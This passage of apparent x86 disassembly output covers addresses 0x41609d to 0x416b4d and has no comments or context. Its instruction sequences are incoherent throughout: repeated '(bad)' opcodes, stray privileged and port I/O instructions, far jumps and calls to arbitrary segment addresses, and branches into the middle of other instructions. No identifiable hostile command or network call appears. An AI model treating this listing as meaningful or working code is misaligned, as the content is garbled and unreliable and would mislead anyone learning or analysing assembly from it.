  41609d:	mov    edx,0x10be7548
  4160a2:	into   
  4160a3:	test   DWORD PTR [ecx],edi
  4160a5:	(bad)  
  4160a6:	mov    cs,WORD PTR [ecx-0x67]
  4160a9:	mul    BYTE PTR [ebx-0x149c734b]
  4160af:	mov    edx,0x32671140
  4160b4:	clc    
  4160b5:	pusha  
  4160b6:	pop    ds
  4160b7:	adc    DWORD PTR [edx-0x4f],ecx
  4160ba:	jnp    0x41609a
  4160bc:	fld    DWORD PTR [edx+0x72]
  4160bf:	push   eax
  4160c0:	clc    
  4160c1:	inc    ebx
  4160c2:	fs pop edi
  4160c4:	pop    esp
  4160c5:	pop    esi
  4160c6:	sbb    DWORD PTR [esi],ebx
  4160c8:	in     eax,dx
  4160c9:	int    0x39
  4160cb:	jae    0x4160b4
  4160cd:	aad    0xb6
  4160cf:	hlt    
  4160d0:	jp     0x4160cf
  4160d2:	sbb    DWORD PTR [ebp+0x50],edi
  4160d5:	jno    0x41610b
  4160d7:	scas   al,BYTE PTR es:[edi]
  4160d8:	call   0xf9d9893b
  4160dd:	hlt    
  4160de:	mov    ch,0x21
  4160e0:	packssdw mm6,mm1
  4160e3:	leave  
  4160e4:	mov    ch,0x9a
  4160e6:	les    eax,FWORD PTR [edx+0x7360881e]
  4160ec:	jge    0x416078
  4160ee:	inc    ebp
  4160ef:	int    0xcb
  4160f1:	push   ss
  4160f2:	ds pop ebp
  4160f4:	sbb    BYTE PTR [ebx-0x3911049b],0x1e
  4160fb:	into   
  4160fc:	pop    ds
  4160fd:	add    esp,eax
  4160ff:	out    dx,al
  416100:	lock imul eax,DWORD PTR [edi+0x35b95db7],0xffffffb0
  416108:	mov    bh,BYTE PTR [edx+edx*2]
  41610b:	scas   al,BYTE PTR es:[edi]
  41610c:	fidiv  DWORD PTR [edx+0x474f9182]
  416112:	scas   al,BYTE PTR es:[edi]
  416113:	dec    esp
  416114:	sti    
  416115:	into   
  416116:	cmp    bh,BYTE PTR [ebp+0x1a]
  416119:	or     ch,cl
  41611b:	inc    ecx
  41611c:	or     BYTE PTR [ebp-0x26ce08cd],0xa8
  416123:	dec    ebx
  416124:	mov    edi,0x1d63315f
  416129:	repz or BYTE PTR [ecx-0x4b],bh
  41612d:	test   DWORD PTR [ecx-0x8],edx
  416130:	pusha  
  416131:	mov    WORD PTR ds:0xe0b072a0,es
  416137:	loop   0x416162
  416139:	xchg   DWORD PTR [ecx+ebx*8-0x5ce09166],esi
  416140:	lods   eax,DWORD PTR ds:[esi]
  416141:	sti    
  416142:	xor    eax,esp
  416144:	jp     0x416116
  416146:	jae    0x416172
  416148:	xchg   esi,eax
  416149:	xchg   ebp,eax
  41614a:	inc    esp
  41614b:	or     ebp,esi
  41614d:	scas   al,BYTE PTR es:[edi]
  41614e:	push   edi
  41614f:	xchg   ebx,eax
  416150:	mov    ebx,0x3c8110a
  416155:	sub    al,0xa8
  416157:	cwde   
  416158:	jp     0x416123
  41615a:	lods   al,BYTE PTR ds:[esi]
  41615b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41615c:	shr    BYTE PTR ss:[eax-0x7519bb2b],1
  416163:	push   ebx
  416164:	std    
  416165:	add    esp,eax
  416167:	ret    0x3755
  41616a:	dec    edx
  41616b:	enter  0xe251,0x0
	...
  4161d3:	add    BYTE PTR [eax],al
  4161d5:	add    BYTE PTR [eax],ah
  4161d7:	jmp    0xdf3d4017
  4161dc:	in     eax,0xff
  4161de:	(bad)  
  4161df:	push   edx
  4161e0:	sub    eax,0x223552f3
  4161e5:	xor    DWORD PTR [edi-0x12],esp
  4161e8:	add    BYTE PTR [eax],al
  4161ea:	add    BYTE PTR [ecx],al
  4161ec:	add    BYTE PTR [eax],al
  4161ee:	cmp    ecx,DWORD PTR [esi+0x1657760e]
  4161f4:	pop    ss
  4161f5:	out    0x73,al
  4161f7:	iret   
  4161f8:	ret    
  4161f9:	ins    DWORD PTR es:[edi],dx
  4161fa:	neg    BYTE PTR [esi+0x5f5c3d64]
  416200:	iret   
  416201:	into   
  416202:	cmp    al,0x5d
  416204:	xchg   esi,eax
  416205:	cmp    eax,0xf262079d
  41620a:	out    0xf3,eax
  41620c:	push   0x74
  41620e:	push   ebp
  41620f:	retf   
  416210:	push   ebp
  416211:	stc    
  416212:	js     0x416251
  416214:	shl    DWORD PTR [eax],1
  416216:	push   ecx
  416217:	dec    ebx
  416218:	test   eax,0x284502a5
  41621d:	xchg   esp,eax
  41621e:	adc    edx,edx
  416220:	push   ds
  416221:	dec    edi
  416222:	fst    QWORD PTR [edi-0x1184c3c5]
  416228:	call   DWORD PTR ds:0x9f001954
  41622e:	enter  0xe4f6,0x67
  416232:	retf   
  416233:	pop    edi
  416234:	icebp  
  416235:	aad    0xc
  416237:	inc    edi
  416238:	js     0x4162a5
  41623a:	mov    WORD PTR [ecx-0x5e162395],si
  416241:	xor    DWORD PTR [edx],ecx
  416243:	adc    DWORD PTR [ebp-0x6326d65c],edx
  416249:	mov    esi,0x94f8de52
  41624e:	sub    esp,DWORD PTR [ebp+0x70]
  416251:	scas   al,BYTE PTR es:[edi]
  416252:	adc    cl,BYTE PTR [edx-0x15]
  416255:	shr    ecx,1
  416257:	cld    
  416258:	(bad)  
  416259:	adc    eax,0xce5ebf9c
  41625e:	xchg   DWORD PTR [esi],esi
  416260:	int    0xd8
  416262:	shl    dh,cl
  416264:	mov    edx,0xd84671f6
  416269:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41626a:	fisttp QWORD PTR [ecx+esi*2]
  41626d:	retf   0xc450
  416270:	ficomp DWORD PTR [edi+0x78895804]
  416276:	ret    
  416277:	(bad)  
  416278:	enter  0xdda6,0x82
  41627c:	add    edx,esp
  41627e:	or     eax,0x64e81e8c
  416283:	and    BYTE PTR [edi-0x72bc78e],bh
  416289:	data16 (bad) 
  41628b:	or     al,0x5e
  41628d:	nop
  41628e:	or     al,0xb6
  416290:	out    0x8c,eax
  416292:	mov    al,ds:0x10d1c114
  416297:	jb     0x416270
  416299:	fisttp QWORD PTR [eax+0x5e]
  41629c:	dec    eax
  41629d:	ret    0x42c2
  4162a0:	int    0x72
  4162a2:	jmp    0xb11e3f2e
  4162a7:	xor    eax,0xa2809e64
  4162ac:	mov    ds:0xa6783e52,eax
  4162b1:	cld    
  4162b2:	ret    0xe4f
  4162b5:	rol    DWORD PTR ds:0xe162d720,1
  4162bb:	out    0xb2,eax
  4162bd:	inc    edx
  4162be:	push   0x72
  4162c0:	fs mov ch,0x30
  4162c3:	or     al,0x87
  4162c5:	cli    
  4162c6:	sahf   
  4162c7:	push   eax
  4162c8:	test   al,0x85
  4162ca:	mov    esp,0x1fa8a6b2
  4162cf:	jle    0x416257
  4162d1:	(bad)  
  4162d3:	gs leave 
  4162d5:	sub    al,0x53
  4162d7:	cmp    ecx,DWORD PTR [edi-0x4b]
  4162da:	mov    cl,0x6f
  4162dc:	arpl   WORD PTR [eax+0x770a3076],cx
  4162e2:	mov    ebp,DWORD PTR [ecx]
  4162e4:	mov    edx,0x24e51b0e
  4162e9:	jb     0x416333
  4162eb:	std    
  4162ec:	cmp    edx,DWORD PTR [edi]
	...
  416356:	and    ebp,DWORD PTR [esi+0x32]
  416359:	and    eax,0x6e377d7f
  41635e:	mov    bl,0x5f
  416360:	call   0x6719:0x81749bee
  416367:	out    dx,eax
  416368:	add    BYTE PTR [eax],al
  41636a:	add    BYTE PTR [ecx],al
  41636c:	add    BYTE PTR [eax],al
  41636e:	jb     0x4163c8
  416370:	xlat   BYTE PTR ds:[ebx]
  416371:	stos   DWORD PTR es:[edi],eax
  416372:	and    eax,0x78fd7f60
  416377:	hlt    
  416378:	and    BYTE PTR [edi],0x3c
  41637b:	test   eax,0x872b42b0
  416380:	push   cs
  416381:	adc    BYTE PTR [ecx-0x1],dl
  416384:	inc    edx
  416385:	or     al,0xfc
  416387:	fwait
  416388:	push   cs
  416389:	mov    esi,0xc7f091d8
  41638e:	jecxz  0x416338
  416390:	inc    edi
  416391:	retf   
  416392:	(bad)  
  416393:	mov    edi,0xa91d7029
  416398:	aam    0x17
  41639a:	repnz dec ebp
  41639c:	js     0x416331
  41639e:	cmc    
  41639f:	mov    bh,0xc1
  4163a1:	fisubr WORD PTR [ecx]
  4163a3:	(bad)  
  4163a4:	ror    eax,cl
  4163a6:	shr    BYTE PTR [eax+0x7445af11],cl
  4163ac:	lock push ebx
  4163ae:	pop    ebx
  4163af:	rol    DWORD PTR [ecx-0x4a],0x91
  4163b3:	lds    esi,FWORD PTR [ebx-0x62f9fd13]
  4163b9:	cld    
  4163ba:	xlat   BYTE PTR ds:[ebx]
  4163bb:	(bad)  
  4163bd:	adc    eax,0xe1b4d00c
  4163c2:	adc    esp,eax
  4163c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163c5:	inc    ecx
  4163c6:	or     DWORD PTR [ebx-0x5f],0xf1385c3b
  4163cd:	sbb    BYTE PTR [ebp-0xd],ch
  4163d0:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4163d2:	shr    edi,cl
  4163d4:	lds    ebx,FWORD PTR [edx]
  4163d6:	stos   BYTE PTR es:[edi],al
  4163d7:	test   BYTE PTR [ebp-0x365bbe2a],bh
  4163dd:	mov    al,ds:0x155c9896
  4163e2:	jno    0x416410
  4163e4:	xor    DWORD PTR [eax+0x62d168e6],esi
  4163ea:	add    ebp,DWORD PTR [edi-0x430162d6]
  4163f0:	jns    0x4163f3
  4163f2:	mov    al,ds:0xabe539c
  4163f7:	sbb    edx,DWORD PTR [edi-0x2c73df50]
  4163fd:	imul   BYTE PTR [ebx+edi*2-0x3aed6c11]
  416404:	out    dx,eax
  416405:	mov    eax,ds:0x1af4a4fb
  41640a:	mov    eax,DWORD PTR ds:0x89b6ac67
  416410:	push   0xffffff9e
  416412:	dec    edi
  416413:	mov    dh,0xa5
  416415:	xchg   ecx,eax
  416416:	clc    
  416417:	stos   DWORD PTR es:[edi],eax
  416418:	pop    ds
  416419:	es sti 
  41641b:	icebp  
  41641c:	push   ds
  41641d:	or     eax,0xdc72f40d
  416422:	out    dx,eax
  416423:	fst    DWORD PTR [ecx+0x2d8faa99]
  416429:	call   0x1bde:0xfac97be6
  416430:	push   cs
  416431:	in     al,dx
  416432:	lahf   
  416433:	in     eax,0x32
  416435:	sub    al,0x8e
  416437:	(bad)  
  416438:	cld    
  416439:	xchg   ecx,eax
  41643a:	les    ecx,FWORD PTR [ebx]
  41643c:	daa    
  41643d:	add    ah,bh
  41643f:	xor    eax,0xc7ea0853
  416444:	push   ebx
  416445:	xchg   edx,eax
  416446:	and    al,0xde
  416448:	add    BYTE PTR [ebp-0x47],bl
  41644b:	mov    al,ds:0xe6f00fcf
  416450:	sub    al,0x7c
  416452:	mov    es,WORD PTR [edi+0x26916ee4]
  416458:	fisttp WORD PTR [eax+esi*1]
  41645b:	call   0x9e377d22
  416460:	retf   
  416461:	pop    es
  416462:	xor    al,0x9b
  416464:	dec    esp
  416465:	push   ebp
  416466:	jns    0x416434
  416468:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416469:	pushf  
  41646a:	jmp    0x0:0x603129
	...
  4164d5:	add    bl,dh
  4164d7:	inc    ebx
  4164d8:	ror    cl,1
  4164da:	lock (bad) 
  4164dd:	jnp    0x41646d
  4164df:	xor    al,0x5a
  4164e1:	xchg   esi,eax
  4164e2:	inc    ebx
  4164e3:	or     eax,0xf06795f4
  4164e8:	add    BYTE PTR [eax],al
  4164ea:	add    BYTE PTR [ecx],al
  4164ec:	add    BYTE PTR [eax],al
  4164ee:	test   al,0xbc
  4164f0:	jge    0x416530
  4164f2:	xor    eax,0x8012ff15
  4164f7:	mov    ds:0x2eaf1c6a,al
  4164fc:	dec    DWORD PTR [edi]
  4164fe:	gs dec edx
  416500:	mov    edi,0x21838436
  416505:	dec    esp
  416506:	dec    eax
  416507:	dec    ecx
  416508:	aas    
  416509:	into   
  41650a:	pop    ds
  41650b:	jmp    0x87ec:0x14277b89
  416512:	jmp    0x922:0x74bbce1c
  416519:	push   eax
  41651a:	jns    0x4164c0
  41651c:	pop    eax
  41651d:	xchg   esi,eax
  41651e:	inc    edi
  41651f:	add    al,0x71
  416521:	adc    edx,esp
  416523:	ja     0x416506
  416525:	arpl   WORD PTR [ebp-0x58f430b4],bp
  41652b:	mov    edx,0x31a2e21c
  416530:	sub    al,0x88
  416532:	outs   dx,BYTE PTR ds:[esi]
  416533:	mov    DWORD PTR [edx+0x15],edx
  416536:	mov    ds:0x89ca4f08,al
  41653b:	dec    edx
  41653c:	aad    0xcc
  41653e:	add    eax,0x320ae29c
  416543:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416544:	mov    eax,0x1faeb066
  416549:	adc    esp,DWORD PTR [edx-0x20eddf6e]
  41654f:	xchg   ecx,eax
  416550:	push   ecx
  416551:	repnz outs dx,BYTE PTR ds:[esi]
  416553:	xor    BYTE PTR [ebx],dh
  416555:	xchg   ecx,eax
  416556:	mov    ch,0x8a
  416558:	or     BYTE PTR [esi+ebx*4-0x4d],dh
  41655c:	or     edx,DWORD PTR [edi+0x54]
  41655f:	mov    bh,0xa3
  416561:	lahf   
  416562:	aad    0x17
  416564:	jae    0x41657f
  416566:	leave  
  416567:	repnz in eax,0xc5
  41656a:	or     bl,dh
  41656c:	nop
  41656d:	dec    ebx
  41656e:	sub    eax,0xb90e0c86
  416573:	lds    ecx,FWORD PTR [ecx-0x77510034]
  416579:	arpl   WORD PTR [ebx-0x36],bp
  41657c:	pop    esi
  41657d:	or     edx,DWORD PTR [ebp+0x34]
  416580:	xchg   ebp,eax
  416581:	dec    esp
  416582:	mov    edx,DWORD PTR [edx-0x6dac07]
  416588:	(bad)  
  416589:	call   0x8f1:0x422b7787
  416590:	cmc    
  416591:	shr    DWORD PTR ds:0x325e1fcf,0x3a
  416598:	packssdw mm7,QWORD PTR ss:[eax]
  41659c:	mov    dh,0x18
  41659e:	jmp    0x416561
  4165a0:	out    dx,eax
  4165a1:	lods   eax,DWORD PTR ds:[esi]
  4165a2:	jle    0x4165c2
  4165a4:	and    al,0x19
  4165a6:	jbe    0x416614
  4165a8:	repz add BYTE PTR [edi-0x3d],bl
  4165ac:	js     0x416608
  4165ae:	lock jae 0x4165ff
  4165b1:	add    DWORD PTR [ebp-0x75e47294],edi
  4165b7:	gs xchg esi,eax
  4165b9:	push   edx
  4165ba:	arpl   WORD PTR [eax],sp
  4165bc:	mov    ebp,0xf1d9a460
  4165c1:	xor    ch,BYTE PTR [edx-0x3b]
  4165c4:	jg     0x416565
  4165c6:	loopne 0x4165b6
  4165c8:	mov    ebx,0x7b50a5ea
  4165cd:	cmp    BYTE PTR [esi],ah
  4165cf:	fild   DWORD PTR [eax+0x7c1826f5]
  4165d5:	jmp    0x41663b
  4165d7:	repnz cwde 
  4165d9:	(bad)  
  4165da:	pop    esi
  4165db:	repnz mov ds:0x6303b462,eax
  4165e1:	sub    dh,0xc3
  4165e4:	outs   dx,BYTE PTR ds:[esi]
  4165e5:	or     esp,esp
  4165e7:	enter  0x48dd,0xcd
  4165eb:	mov    ecx,0x9e4
	...
  416654:	add    BYTE PTR [eax],al
  416656:	and    eax,0xfff32bd8
  41665b:	repz std 
  41665d:	fisub  WORD PTR [esi-0x75b04354]
  416663:	aam    0x3f
  416665:	add    esp,DWORD PTR [edi-0xf]
  416668:	add    BYTE PTR [eax],al
  41666a:	add    BYTE PTR [ecx],al
  41666c:	add    BYTE PTR [eax],al
  41666e:	add    eax,0xf33e1ed4
  416673:	fcom   DWORD PTR [esi]
  416675:	(bad)  
  416677:	and    eax,0x84590100
  41667c:	pop    eax
  41667d:	sbb    DWORD PTR [edi],esi
  41667f:	adc    eax,0x929be571
  416684:	leave  
  416685:	retf   0xa7ba
  416688:	bound  edi,QWORD PTR [ecx]
  41668a:	dec    esp
  41668b:	lea    esi,[ecx+ecx*8+0x78]
  41668f:	cmp    BYTE PTR [ecx-0x71378951],dl
  416695:	pop    ss
  416696:	paddd  mm4,QWORD PTR [eax+0x7a92cfce]
  41669d:	mov    dl,0x83
  41669f:	or     edi,DWORD PTR [edi-0x33]
  4166a2:	leave  
  4166a3:	adc    ebx,DWORD PTR [ebp+0x21a65018]
  4166a9:	cs jbe 0x416698
  4166ac:	shl    DWORD PTR [ebx+esi*8-0x26],cl
  4166b0:	and    BYTE PTR [edx-0x64b09869],0xac
  4166b7:	cmp    dh,BYTE PTR [edx-0x5d]
  4166ba:	frstor [edi]
  4166bc:	gs leave 
  4166be:	rol    DWORD PTR [ecx+0x5f],cl
  4166c1:	fwait
  4166c2:	xor    al,0xc
  4166c4:	loopne 0x416681
  4166c6:	push   edx
  4166c7:	(bad)  
  4166c8:	push   DWORD PTR [eax]
  4166ca:	out    dx,al
  4166cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166cc:	into   
  4166cd:	std    
  4166ce:	dec    esp
  4166cf:	inc    ebx
  4166d0:	mov    ebp,0x526b8c02
  4166d5:	jmp    0x6492:0xda99e2c5
  4166dc:	push   ebx
  4166dd:	pop    edx
  4166de:	pushf  
  4166df:	pop    ss
  4166e0:	mov    ah,0x56
  4166e2:	clc    
  4166e3:	jmp    DWORD PTR [esp+edi*1+0x23a31e2]
  4166ea:	call   0xf2aa:0x664dbb6a
  4166f1:	push   eax
  4166f2:	stos   DWORD PTR es:[edi],eax
  4166f3:	jecxz  0x416748
  4166f5:	push   esi
  4166f6:	not    DWORD PTR [ecx]
  4166f8:	push   0x20db3048
  4166fd:	cmp    eax,0xdaf126f0
  416702:	jbe    0x4166bc
  416704:	cld    
  416705:	repz test BYTE PTR [ebx+edi*4+0x34],bl
  41670a:	inc    ecx
  41670b:	mov    dh,0x2f
  41670d:	push   edx
  41670e:	int3   
  41670f:	mov    esp,0x956b0827
  416714:	or     eax,DWORD PTR [edx+0x71e5dc83]
  41671a:	call   0x69c6c5e4
  41671f:	xor    al,0x15
  416721:	adc    DWORD PTR [eax+edi*8],edi
  416724:	sbb    ah,al
  416726:	cwde   
  416727:	out    dx,al
  416728:	addr16 mov ebp,0x38ef89d1
  41672e:	retf   0xbb00
  416731:	mov    dh,0x9d
  416733:	es mov ecx,0xc3508515
  416739:	and    al,0x62
  41673b:	push   esp
  41673c:	xchg   edx,eax
  41673d:	imul   ebx,DWORD PTR [ecx],0x4b
  416740:	sub    ecx,DWORD PTR [esi+ebp*1-0x11]
  416744:	pop    eax
  416745:	popf   
  416746:	push   eax
  416747:	aaa    
  416748:	jmp    0x416793
  41674a:	xchg   BYTE PTR [edx],bl
  41674c:	sbb    edx,DWORD PTR [edx+0x36]
  41674f:	sbb    eax,eax
  416751:	leave  
  416752:	mov    ds:0x5fae2c23,al
  416757:	or     al,0x24
  416759:	jmp    0x41670c
  41675b:	mov    ah,0xdc
  41675d:	outs   dx,BYTE PTR ds:[esi]
  41675e:	shr    BYTE PTR [eax+0x12],1
  416761:	in     al,dx
  416762:	fld    QWORD PTR ss:[ebp+0x7a]
  416766:	and    al,0x8f
  416768:	out    0x48,eax
  41676a:	jnp    0x4167b0
  41676c:	(bad)  
  41676d:	jmp    0x0:0x0
	...
  4167d4:	add    BYTE PTR [eax],al
  4167d6:	(bad)  
  4167d7:	(bad)  
  4167d9:	(bad)  
  4167da:	(bad)  
  4167dc:	out    0xff,eax
  4167de:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  4167e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167e3:	cwde   
  4167e4:	sbb    ah,BYTE PTR [edx+0xf267]
  4167ea:	add    BYTE PTR [ecx],al
  4167ec:	add    BYTE PTR [eax],al
  4167ee:	loope  0x4167a3
  4167f0:	or     ch,BYTE PTR [edx-0x72b1b271]
  4167f6:	xchg   dl,bl
  4167f8:	cmc    
  4167f9:	mov    edi,0xcdcd8d67
  4167fe:	cli    
  4167ff:	daa    
  416800:	mov    DWORD PTR [esi+0x7e],esp
  416803:	sbb    dh,BYTE PTR [esi]
  416805:	dec    ecx
  416806:	hlt    
  416807:	dec    edi
  416808:	adc    BYTE PTR [edx],dl
  41680a:	sbb    edi,eax
  41680c:	mov    bh,0x49
  41680e:	sbb    eax,0xa6b7e33d
  416813:	mov    ch,0x6e
  416815:	pop    esp
  416816:	jecxz  0x416842
  416818:	mov    ebp,0xa16b97ba
  41681d:	das    
  41681e:	and    BYTE PTR [ecx-0x62],0xbc
  416822:	pop    edi
  416823:	pop    ebx
  416824:	loope  0x41686e
  416826:	add    DWORD PTR [edi],esi
  416828:	mov    BYTE PTR [edi],bh
  41682a:	rol    ebx,cl
  41682c:	pop    edi
  41682d:	mov    ecx,0xd7a0025d
  416832:	in     eax,dx
  416833:	lods   eax,DWORD PTR ds:[esi]
  416834:	and    al,0x11
  416836:	into   
  416837:	in     al,0x2d
  416839:	cmc    
  41683a:	mov    WORD PTR [ebp-0x3b83f8b0],ss
  416840:	test   eax,0xa75710f6
  416845:	mov    edi,0x7622a11f
  41684a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41684b:	scas   eax,DWORD PTR es:[edi]
  41684c:	ins    BYTE PTR es:[edi],dx
  41684d:	sahf   
  41684e:	sahf   
  41684f:	xor    BYTE PTR [eax-0x295df953],bh
  416855:	arpl   cx,bp
  416857:	xchg   DWORD PTR [edx+0x5],edx
  41685a:	pop    ebx
  41685b:	ins    DWORD PTR es:[edi],dx
  41685c:	xchg   edx,eax
  41685d:	push   edi
  41685e:	scas   eax,DWORD PTR es:[edi]
  41685f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416860:	ficom  DWORD PTR [edx]
  416862:	ficomp DWORD PTR [edi+0x3812307e]
  416868:	ret    0x5c9
  41686b:	pop    ecx
  41686c:	test   DWORD PTR [ecx+edi*8+0x73],ebx
  416870:	mov    edx,0x640bb097
  416875:	mov    BYTE PTR [edi+0x4b],al
  416878:	jle    0x416812
  41687a:	fmulp  st(6),st
  41687c:	mov    edx,0x9bb6e910
  416881:	push   edi
  416882:	sahf   
  416883:	lods   al,BYTE PTR ds:[esi]
  416884:	jle    0x416808
  416886:	test   al,0x15
  416888:	mov    esi,0x736e23d0
  41688d:	push   eax
  41688e:	dec    ebp
  41688f:	ins    BYTE PTR es:[edi],dx
  416890:	sbb    dl,BYTE PTR [edi]
  416892:	rol    esp,1
  416894:	aas    
  416895:	jns    0x41683e
  416897:	push   0x3f9d766
  41689c:	lods   eax,DWORD PTR ds:[esi]
  41689d:	and    bl,cl
  41689f:	mov    edx,DWORD PTR [esi]
  4168a1:	or     BYTE PTR [ebp+0x67854d9],bl
  4168a7:	outs   dx,DWORD PTR ds:[esi]
  4168a8:	cdq    
  4168a9:	call   0x57d97e9
  4168ae:	sub    DWORD PTR ds:0x65ec60f4,esi
  4168b4:	xor    al,0x58
  4168b6:	or     dl,dh
  4168b8:	dec    BYTE PTR [eax-0x4fadf036]
  4168be:	imul   ebx,DWORD PTR [ebx-0x45bd57bd],0xffffffb3
  4168c5:	fild   QWORD PTR [ecx]
  4168c7:	push   esi
  4168c8:	xor    esi,DWORD PTR [esi+0x4c7e99ce]
  4168ce:	retf   0x6796
  4168d1:	daa    
  4168d2:	stos   DWORD PTR es:[edi],eax
  4168d3:	pop    DWORD PTR [ecx]
  4168d5:	loopne 0x41688d
  4168d7:	inc    ebx
  4168d8:	cwde   
  4168d9:	push   0xffffff96
  4168db:	fisttp WORD PTR [edi]
  4168dd:	jbe    0x4168c9
  4168df:	mov    dl,0x31
  4168e1:	add    eax,0xf1e6c4fa
  4168e6:	jmp    0x6cf89237
  4168eb:	sub    DWORD PTR [edi+0x73],ebp
	...
  416955:	add    cl,dl
  416957:	scas   eax,DWORD PTR es:[edi]
  416958:	push   es
  416959:	repz jle 0x416957
  41695c:	cmc    
  41695d:	scas   eax,DWORD PTR es:[edi]
  41695e:	sub    DWORD PTR [edi-0x5d],edi
  416961:	mov    ebp,0x9f19f6f0
  416966:	repz add BYTE PTR [bx+si],al
  41696a:	add    BYTE PTR [ecx],al
  41696c:	add    BYTE PTR [eax],al
  41696e:	and    eax,0xc93ef6c5
  416973:	mov    cl,0x88
  416975:	mov    esi,0x29fe9295
  41697a:	es in  al,dx
  41697c:	sub    DWORD PTR ss:[ebx+0x29d60db5],eax
  416983:	mov    ebp,0xc1817c1b
  416988:	fwait
  416989:	mov    WORD PTR [ecx-0x23],gs
  41698c:	cmp    al,0x74
  41698e:	sbb    dl,bl
  416990:	push   ax
  416992:	stos   BYTE PTR es:[edi],al
  416993:	call   DWORD PTR [ebx-0x7e]
  416996:	(bad)  
  416998:	xchg   edx,eax
  416999:	push   edx
  41699a:	stc    
  41699b:	leave  
  41699c:	in     al,0x8e
  41699e:	xchg   edi,eax
  41699f:	es aad 0xea
  4169a2:	jecxz  0x416965
  4169a4:	sahf   
  4169a5:	fist   WORD PTR [esi-0x30]
  4169a8:	mov    edx,0xbae6daaa
  4169ad:	xor    al,0x2b
  4169af:	add    dh,BYTE PTR [esp+ebp*4-0x36c8eec8]
  4169b6:	aam    0x8b
  4169b8:	lods   eax,DWORD PTR ds:[esi]
  4169b9:	sub    eax,ebx
  4169bb:	fistp  WORD PTR [eax-0x2b1c12db]
  4169c1:	or     dh,cl
  4169c3:	(bad)  
  4169c4:	cld    
  4169c5:	jae    0x41696e
  4169c7:	inc    esp
  4169c8:	or     DWORD PTR [ecx+0x1d724c73],ebp
  4169ce:	mul    eax
  4169d0:	mov    esp,0x8a2468df
  4169d5:	mov    esp,0xd3b70a00
  4169da:	inc    ebp
  4169db:	dec    ebp
  4169dc:	jge    0x416972
  4169de:	xchg   esp,ecx
  4169e0:	cmp    al,0xb6
  4169e2:	ins    BYTE PTR es:[edi],dx
  4169e3:	dec    eax
  4169e4:	xor    dl,bl
  4169e6:	mov    al,ds:0x11d33d64
  4169eb:	xchg   edx,eax
  4169ec:	jp     0x41698f
  4169ee:	(bad)  [ebx]
  4169f0:	cmp    bl,cl
  4169f2:	push   0xa8f27a02
  4169f7:	sub    bl,0x13
  4169fa:	push   es
  4169fb:	lock (bad) 
  4169fd:	jns    0x416a40
  4169ff:	das    
  416a00:	mov    DWORD PTR ds:0x3157508e,eax
  416a06:	icebp  
  416a07:	xor    eax,0x3c07bbf4
  416a0c:	mov    fs,WORD PTR [eax-0x34]
  416a0f:	inc    ebp
  416a10:	cmp    al,0x91
  416a12:	mov    esp,0x8b0b4a83
  416a17:	or     eax,0x7966aec9
  416a1c:	inc    ebp
  416a1d:	lds    ebx,FWORD PTR ds:0x56a1ed9
  416a23:	jl     0x416a37
  416a25:	repz inc ecx
  416a27:	jg     0x4169fc
  416a29:	sbb    BYTE PTR [edx-0x7ce3f767],dl
  416a2f:	xchg   esp,eax
  416a30:	mov    cl,0x79
  416a32:	hlt    
  416a33:	fild   QWORD PTR ds:0x2f6338d2
  416a39:	or     ch,BYTE PTR [edi+ebx*4]
  416a3c:	pop    ecx
  416a3d:	push   esi
  416a3e:	rcl    DWORD PTR [ebp-0x168e7c79],0x2c
  416a45:	mov    ebp,DWORD PTR [ebp+0xb]
  416a48:	std    
  416a49:	(bad)  
  416a4a:	fisub  WORD PTR [ebx+edi*1+0x2f]
  416a4e:	repnz xchg edi,ecx
  416a51:	mov    bl,0x28
  416a53:	add    DWORD PTR [ecx+0x45],0x8d794363
  416a5a:	adc    ah,BYTE PTR [eax+0x64]
  416a5d:	push   ebp
  416a5e:	or     bl,BYTE PTR [edx]
  416a60:	pop    ecx
  416a61:	addr16 aas 
  416a63:	bound  ecx,QWORD PTR [ebx]
  416a65:	fsubr  DWORD PTR [ecx]
  416a67:	add    eax,0x8dcfbf4c
  416a6c:	jecxz  0x416aa1
	...
  416ad6:	retf   
  416ad7:	pusha  
  416ad8:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416ade:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416adf:	mov    al,ds:0xf9720ba3
  416ae4:	jp     0x416ab5
  416ae6:	addr16 hlt 
  416ae8:	add    BYTE PTR [eax],al
  416aea:	add    BYTE PTR [ecx],al
  416aec:	add    BYTE PTR [eax],al
  416aee:	js     0x416a71
  416af0:	jo     0x416a9c
  416af2:	loopne 0x416b25
  416af4:	test   al,0xcb
  416af6:	aam    0x8
  416af8:	repnz add ecx,DWORD PTR [eax+0x32]
  416afc:	adc    BYTE PTR [edx+0x1ed28f86],bh
  416b02:	xchg   ecx,eax
  416b03:	fadd   DWORD PTR [edi+0x4ec224a9]
  416b09:	dec    esi
  416b0a:	inc    ebx
  416b0b:	adc    DWORD PTR fs:[ecx+0x1b],ecx
  416b0f:	fwait
  416b10:	mov    ch,0x0
  416b12:	xchg   DWORD PTR [esi-0x3f],edi
  416b15:	mov    eax,0xb0a78e76
  416b1a:	mov    bl,BYTE PTR [ebp-0x68]
  416b1d:	out    dx,eax
  416b1e:	add    al,0x63
  416b20:	pusha  
  416b21:	loope  0x416ab5
  416b23:	sub    BYTE PTR [ecx+0x109810bf],bl
  416b29:	sar    BYTE PTR ds:0x341970b9,0xf9
  416b30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b31:	lods   al,BYTE PTR ds:[esi]
  416b32:	jo     0x416ac7
  416b34:	pop    esi
  416b35:	xchg   ebx,eax
  416b36:	mov    ah,0x4d
  416b38:	cmp    edi,DWORD PTR [edx+0x3e]
  416b3b:	pusha  
  416b3c:	cmp    dh,cl
  416b3e:	adc    BYTE PTR [edx],ch
  416b40:	mov    cl,0xab
  416b42:	adc    ch,BYTE PTR [eax+0x5d451286]
  416b48:	adc    al,0xf7
  416b4a:	sub    DWORD PTR [ebx-0x34],ebp
  416b4d:	xor    eax,0xcda27dfc
